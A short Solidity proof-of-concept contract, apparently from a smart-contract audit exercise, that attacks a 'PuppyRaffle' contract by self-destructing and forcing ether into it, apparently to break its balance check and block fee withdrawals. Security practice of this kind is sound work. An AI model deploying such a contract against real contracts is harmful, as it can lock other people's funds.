//SPDX-License-Identifier : MIT
pragma solidity ^0.7.6;
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
contract Nowithdraw {
    PuppyRaffle public raffle;
    constructor(PuppyRaffle _raffle)
    {
        raffle = _raffle;
    }
    function attack() public payable{
        address payable addr = payable (address(raffle));
        selfdestruct(addr);
    }
}